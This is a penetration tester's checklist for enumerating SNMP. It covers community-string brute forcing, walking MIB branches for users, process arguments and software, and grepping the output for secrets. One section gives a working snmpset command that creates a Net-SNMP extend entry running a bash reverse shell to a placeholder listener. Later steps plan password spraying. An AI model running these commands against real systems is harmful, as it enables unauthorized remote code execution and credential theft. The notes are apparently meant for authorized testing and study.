# SNMP enumeration

## Is it there
SNMP is UDP 161, so it shows up in a UDP scan or not at all.
sudo nmap -Pn -sU -p 161 -sV <TargetIP>
snmpwalk -v2c -c public <TargetIP> 1.3.6.1.2.1.1
snmpwalk -v1 -c public <TargetIP> 1.3.6.1.2.1.1
- [ ] An answer means public works, and it is the value for <Community>

## The community string
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TargetIP>
sudo nmap -Pn -sU -p 161 --script snmp-brute <TargetIP>
- [ ] The word in brackets is the community string, and the rest names the OS and its build
- [ ] onesixtyone speaks only v1: no answer proves little, so snmp-brute as well
- [ ] Still nothing: the much larger snmp.txt in the same seclists folder

## Readable names
Once on Kali, so values print as names rather than numbers:
sudo apt install -y snmp-mibs-downloader
sudo sed -i 's/^mibs :/# mibs :/' /etc/snmp/snmp.conf

## Walk all of it
snmpbulkwalk -v2c -c '<Community>' <TargetIP> | tee snmp-full.txt
snmpwalk -v1 -c '<Community>' <TargetIP> | tee snmp-full.txt
- [ ] -v2c times out: the v1 line, and -t 10 on a slow link
- [ ] Hex-STRING values: walk again with -Oa to print them as text
grep -iE 'pass|pwd|user|login|key|secret' snmp-full.txt
snmp-check -c '<Community>' <TargetIP>

## The branches that matter
Windows user accounts:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.4.1.77.1.2.25
Running processes, then their paths and their arguments:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.25.4.2.1.4
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.25.4.2.1.5
Installed software:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.25.6.3.1.2
Listening TCP ports:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.6.13.1.3
The output of Net-SNMP extend scripts, on Linux:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.4.1.8072.1.3.2.3.1.2
The host's addresses, IPv6 included:
snmpwalk -v2c -c '<Community>' <TargetIP> 1.3.6.1.2.1.4.34.1.3
- [ ] krbtgt among the users: a domain controller, :Pb ad
- [ ] Passwords in process arguments: the number at the end of each OID is the PID, to match with its name
- [ ] Antivirus, databases and anything non-default among the processes and software, versions through searchsploit
- [ ] A port bound to 127.0.0.1 here and missing from my scan: reached later through a forward
- [ ] An IPv6 address: a full scan over it with nmap -6, which may show more
- [ ] Extend output: backup and check scripts that print secrets

## A community I can write
A read-write string, often private, runs a command through Net-SNMP extend on Linux:
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c '<Community>' <TargetIP> 'nsExtendStatus."pwn"' = createAndGo 'nsExtendCommand."pwn"' = /bin/bash 'nsExtendArgs."pwn"' = '-c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'
rlwrap nc -lvnp <LPORT>
Then a walk of the extend table runs it:
snmpwalk -v2c -c '<Community>' <TargetIP> NET-SNMP-EXTEND-MIB::nsExtendObjects
- [ ] notWritable or noAccess: the string is read-only

## Afterwards
- [ ] Every user found into users.txt, for spraying: :Pb spraying
- [ ] Every password found tried on SSH, SMB and the web logins
